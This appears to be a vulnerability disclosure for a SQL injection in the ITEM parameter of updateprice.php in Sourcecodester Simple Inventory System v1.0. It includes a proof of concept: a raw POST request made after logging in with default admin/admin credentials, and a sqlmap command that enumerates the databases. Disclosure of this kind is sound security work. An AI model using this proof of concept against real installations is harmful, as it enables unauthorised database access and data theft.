### SQL injection vulnerability exists in Sourcecodester Simple Inventory System

official website:https://www.sourcecodester.com/php/4481/simple-inventory-system-using-phpmysql.html

version:v1.0

route：updateprice.php

injection parameter:$_POST['ITEM']

#### 1.Vulnerability analysis

As shown in the figure below, in updateprice.php, after the ITEM parameter is passed in through post, it is directly spliced into the SQL update statement without any security filtering, resulting in a SQL injection vulnerability. We can obtain any information in the database through Boolean injection.

![image-20240517161051373](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Inventory System Sql Inject-2.assets/image-20240517161051373.png)

#### 2.Vulnerability verification and exploit

After admin/admin logs in to the system backend, replace the cookie content in the following POC and save it as 1.txt.

```
POST /updateprice.php HTTP/1.1
Host: 10.15.6.184:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://10.15.6.184:82
Connection: close
Referer: http://10.15.6.184:82/tableedit.php
Cookie: PHPSESSID=b3e8bialebcp70drgpo4ojapp1
Upgrade-Insecure-Requests: 1

ITEM=1&itemprice=123
```

python salmap.py -r 1.txt --batch --dbs

![image-20240517160753953](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Inventory System Sql Inject-2.assets/image-20240517160753953.png)

